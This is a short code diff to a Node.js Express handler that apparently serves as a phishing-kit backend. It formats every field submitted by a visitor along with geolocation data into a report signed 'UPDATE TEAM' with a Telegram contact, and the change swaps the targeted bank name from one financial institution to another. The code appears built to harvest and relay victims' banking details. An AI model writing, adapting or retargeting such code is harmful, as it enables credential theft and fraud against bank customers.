@@ -159,11 +159,11 @@ app.post('/receive', async (req, res) => {
     const prepareMessage = (header, type, includeFullGeo = false) => {
       message += `👤 ${header}\n========================\n`;
       Object.keys(myObject).forEach(key => {
-        if (key.toLowerCase() !== 'visitor' && myObject[key]) {
+        if (key.toLowerCase() !== 'undefined' && myObject[key]) {
           message += `${key.toUpperCase()}: ${myObject[key]}\n`;
         }
       });
-      message += `\n========================\n\n` + (includeFullGeo ? fullGeoInfo : basicGeoInfo) + `========================\n\n✅ UPDATE TEAM WELLBYFINANCIAL| \n💬 Telegram: https://t.me/updteams\n`;
+      message += `\n========================\n\n` + (includeFullGeo ? fullGeoInfo : basicGeoInfo) + `========================\n\n✅ UPDATE TEAM SUN-FEDERAL| \n💬 Telegram: https://t.me/updteams\n`;
 
       console.log(type);
       res.send({ url: type });
